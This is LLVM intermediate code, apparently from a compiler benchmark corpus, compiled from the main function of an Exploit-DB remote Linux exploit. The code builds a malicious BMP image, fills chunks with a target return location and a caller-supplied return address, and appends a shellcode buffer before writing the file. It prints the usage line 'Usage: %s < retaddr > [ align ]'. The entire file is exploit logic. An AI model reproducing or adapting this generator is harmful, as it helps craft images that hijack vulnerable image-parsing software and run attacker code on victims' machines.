; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_408.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_408.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.bmp = type { i8*, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i64 }

@ALIGN = common dso_local global i32 0, align 4
@BS = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [34 x i8] c"\09Usage: %s < retaddr > [ align ]\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [15 x i8] c"get bent bitch\00", align 1
@.str.2 = private unnamed_addr constant [4 x i8] c"%lx\00", align 1
@BMP_HDR_SZ = common dso_local global i32 0, align 4
@RETLOC = common dso_local global i64 0, align 8
@NCHUNK_BYTES = common dso_local global i32 0, align 4
@CHUNKSZ = common dso_local global i32 0, align 4
@remote = common dso_local global %struct.bmp* null, align 8
@SHELL_LEN = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca %struct.bmp, align 8
  %13 = alloca %struct.bmp, align 8
  %14 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %15 = load i32, i32* @ALIGN, align 4
  store i32 %15, i32* %8, align 4
  %16 = load i32, i32* @BS, align 4
  %17 = zext i32 %16 to i64
  %18 = call i8* @llvm.stacksave()
  store i8* %18, i8** %9, align 8
  %19 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %10, align 8
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 2
  br i1 %21, label %22, label %29

22:                                               ; preds = %2
  %23 = load i32, i32* @stderr, align 4
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @fprintf(i32 %23, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str, i64 0, i64 0), i8* %26)
  %28 = load i32, i32* @EXIT_FAILURE, align 4
  store i32 %28, i32* %3, align 4
  store i32 1, i32* %14, align 4
  br label %126

29:                                               ; preds = %2
  %30 = load i32, i32* %4, align 4
  %31 = icmp sgt i32 %30, 2
  br i1 %31, label %32, label %45

32:                                               ; preds = %29
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 2
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @atoi(i8* %35)
  store i32 %36, i32* %8, align 4
  %37 = load i32, i32* %8, align 4
  %38 = icmp slt i32 %37, 0
  br i1 %38, label %42, label %39

39:                                               ; preds = %32
  %40 = load i32, i32* %8, align 4
  %41 = icmp sgt i32 %40, 15
  br i1 %41, label %42, label %44

42:                                               ; preds = %39, %32
  %43 = call i32 @die(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  br label %44

44:                                               ; preds = %42, %39
  br label %45

45:                                               ; preds = %44, %29
  %46 = load i8**, i8*** %5, align 8
  %47 = getelementptr inbounds i8*, i8** %46, i64 1
  %48 = load i8*, i8** %47, align 8
  %49 = call i32 @sscanf(i8* %48, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.2, i64 0, i64 0), i32* %11)
  %50 = load i32, i32* @BMP_HDR_SZ, align 4
  %51 = call i32 @memset(%struct.bmp* %12, i32 0, i32 %50)
  %52 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 0
  %53 = load i8*, i8** %52, align 8
  %54 = getelementptr inbounds i8, i8* %53, i64 0
  store i8 66, i8* %54, align 1
  %55 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 0
  %56 = load i8*, i8** %55, align 8
  %57 = getelementptr inbounds i8, i8* %56, i64 1
  store i8 77, i8* %57, align 1
  %58 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 1
  store i32 3126, i32* %58, align 8
  %59 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 2
  store i32 40, i32* %59, align 4
  %60 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 3
  store i32 1, i32* %60, align 8
  %61 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 4
  store i32 8, i32* %61, align 4
  %62 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 5
  store i32 1, i32* %62, align 8
  %63 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 6
  store i32 1, i32* %63, align 4
  %64 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 7
  store i32 8, i32* %64, align 8
  %65 = getelementptr inbounds %struct.bmp, %struct.bmp* %12, i32 0, i32 8
  store i32 18, i32* %65, align 4
  %66 = getelementptr inbounds %struct.bmp, %struct.bmp* %13, i32 0, i32 9
  store i32 224, i32* %66, align 8
  %67 = getelementptr inbounds %struct.bmp, %struct.bmp* %13, i32 0, i32 10
  store i32 -4, i32* %67, align 4
  %68 = load i64, i64* @RETLOC, align 8
  %69 = sub nsw i64 %68, 12
  %70 = getelementptr inbounds %struct.bmp, %struct.bmp* %13, i32 0, i32 12
  store i64 %69, i64* %70, align 8
  %71 = load i32, i32* %11, align 4
  %72 = getelementptr inbounds %struct.bmp, %struct.bmp* %13, i32 0, i32 11
  store i32 %71, i32* %72, align 8
  %73 = load i32, i32* @BMP_HDR_SZ, align 4
  %74 = call i32 @memcpy(i8* %19, %struct.bmp* %12, i32 %73)
  %75 = load i32, i32* @BMP_HDR_SZ, align 4
  %76 = load i32, i32* %6, align 4
  %77 = add nsw i32 %76, %75
  store i32 %77, i32* %6, align 4
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 4
  store i32 %79, i32* %6, align 4
  %80 = load i32, i32* %6, align 4
  %81 = add nsw i32 %80, 1
  store i32 %81, i32* %6, align 4
  %82 = sext i32 %80 to i64
  %83 = getelementptr inbounds i8, i8* %19, i64 %82
  store i8 0, i8* %83, align 1
  %84 = load i32, i32* %6, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %6, align 4
  %86 = sext i32 %84 to i64
  %87 = getelementptr inbounds i8, i8* %19, i64 %86
  store i8 -1, i8* %87, align 1
  %88 = load i32, i32* %8, align 4
  %89 = load i32, i32* %6, align 4
  %90 = add nsw i32 %89, %88
  store i32 %90, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %91

91:                                               ; preds = %107, %45
  %92 = load i32, i32* %7, align 4
  %93 = load i32, i32* @NCHUNK_BYTES, align 4
  %94 = load i32, i32* @CHUNKSZ, align 4
  %95 = sub nsw i32 %93, %94
  %96 = sub nsw i32 %95, 1
  %97 = icmp slt i32 %92, %96
  br i1 %97, label %98, label %111

98:                                               ; preds = %91
  %99 = load i32, i32* %6, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i8, i8* %19, i64 %100
  %102 = load i32, i32* %7, align 4
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds i8, i8* %101, i64 %103
  %105 = load i32, i32* @CHUNKSZ, align 4
  %106 = call i32 @memcpy(i8* %104, %struct.bmp* %13, i32 %105)
  br label %107

107:                                              ; preds = %98
  %108 = load i32, i32* @CHUNKSZ, align 4
  %109 = load i32, i32* %7, align 4
  %110 = add nsw i32 %109, %108
  store i32 %110, i32* %7, align 4
  br label %91

111:                                              ; preds = %91
  %112 = load i32, i32* %7, align 4
  %113 = load i32, i32* %6, align 4
  %114 = add nsw i32 %113, %112
  store i32 %114, i32* %6, align 4
  %115 = load i32, i32* %6, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8, i8* %19, i64 %116
  %118 = load %struct.bmp*, %struct.bmp** @remote, align 8
  %119 = load i32, i32* @SHELL_LEN, align 4
  %120 = call i32 @memcpy(i8* %117, %struct.bmp* %118, i32 %119)
  %121 = load i32, i32* @SHELL_LEN, align 4
  %122 = load i32, i32* %6, align 4
  %123 = add nsw i32 %122, %121
  store i32 %123, i32* %6, align 4
  %124 = load i32, i32* %6, align 4
  %125 = call i32 @make_bmp(i8* %19, i32 %124)
  store i32 0, i32* %3, align 4
  store i32 1, i32* %14, align 4
  br label %126

126:                                              ; preds = %111, %22
  %127 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %127)
  %128 = load i32, i32* %3, align 4
  ret i32 %128
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @fprintf(i32, i8*, i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @die(i8*) #2

declare dso_local i32 @sscanf(i8*, i8*, i32*) #2

declare dso_local i32 @memset(%struct.bmp*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, %struct.bmp*, i32) #2

declare dso_local i32 @make_bmp(i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
